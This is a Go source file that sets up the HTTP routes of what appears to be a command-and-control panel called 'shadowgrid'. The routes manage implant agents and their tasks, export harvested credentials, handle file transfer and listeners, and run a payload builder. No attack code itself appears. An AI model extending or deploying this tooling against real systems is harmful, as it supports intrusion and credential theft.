package api

import (
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"

	"shadowgrid/config"
	"shadowgrid/database"
)

type Server struct {
	DB     *database.DB
	Config *config.Config
	Router *chi.Mux
}

func NewServer(db *database.DB, cfg *config.Config) *Server {
	s := &Server{
		DB:     db,
		Config: cfg,
		Router: chi.NewRouter(),
	}
	s.setupRoutes()
	return s
}

func (s *Server) setupRoutes() {
	r := s.Router

	r.Use(middleware.Logger)
	r.Use(middleware.Recoverer)
	r.Use(middleware.RequestID)
	r.Use(corsMiddleware)

	// Public auth
	r.Post("/api/auth/login", s.handleLogin)

	// Agent endpoints (AES key auth, no JWT) — registered in main.go via listener.Handler

	// Protected API
	r.Group(func(r chi.Router) {
		r.Use(s.jwtMiddleware)

		r.Get("/api/auth/me", s.handleMe)

		// Agents
		r.Get("/api/agents", s.handleGetAgents)
		r.Get("/api/agents/{id}", s.handleGetAgent)
		r.Delete("/api/agents/{id}", s.handleDeleteAgent)
		r.Post("/api/agents/{id}/tasks", s.handleCreateTask)
		r.Get("/api/agents/{id}/tasks", s.handleGetAgentTasks)
		r.Get("/api/agents/{id}/results", s.handleGetAgentResults)

		// Credentials
		r.Get("/api/credentials", s.handleGetCredentials)
		r.Get("/api/credentials/export", s.handleExportCredentials)

		// Files
		r.Get("/api/files", s.handleGetFiles)
		r.Post("/api/files/upload", s.handleFileUpload)
		r.Get("/api/files/{id}/download", s.handleFileDownload)

		// Listeners
		r.Get("/api/listeners", s.handleGetListeners)
		r.Post("/api/listeners", s.handleCreateListener)
		r.Put("/api/listeners/{id}", s.handleUpdateListener)
		r.Post("/api/listeners/{id}/start", s.handleStartListener)
		r.Post("/api/listeners/{id}/stop", s.handleStopListener)

		// Stats
		r.Get("/api/stats", s.handleGetStats)
		r.Get("/api/activity", s.handleGetActivity)

		// Builder
		r.Post("/api/builder/generate", s.handleBuilderGenerate)
		r.Get("/api/builder/status/{id}", s.handleBuilderStatus)
		r.Get("/api/builder/download/{id}", s.handleBuilderDownload)
		r.Get("/api/builder/history", s.handleBuilderHistory)

		// Settings
		r.Get("/api/settings", s.handleGetSettings)
		r.Post("/api/settings", s.handleUpdateSettings)
	})

	// Serve static React panel
	fileServer(r, "/", http.Dir(s.Config.StaticDir))
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func fileServer(r chi.Router, path string, root http.FileSystem) {
	if path != "/" && path[len(path)-1] != '/' {
		r.Get(path, http.RedirectHandler(path+"/", 301).ServeHTTP)
		path += "/"
	}
	path += "*"
	r.Get(path, func(w http.ResponseWriter, r *http.Request) {
		rctx := chi.RouteContext(r.Context())
		pathPrefix := strings.TrimSuffix(rctx.RoutePattern(), "/*")
		fs := http.StripPrefix(pathPrefix, http.FileServer(root))
		// Try to serve the file; if not found, serve index.html for SPA routing
		f, err := root.Open(strings.TrimPrefix(r.URL.Path, pathPrefix))
		if err != nil {
			// Serve index.html for SPA
			r.URL.Path = "/"
		} else {
			f.Close()
		}
		fs.ServeHTTP(w, r)
	})
}
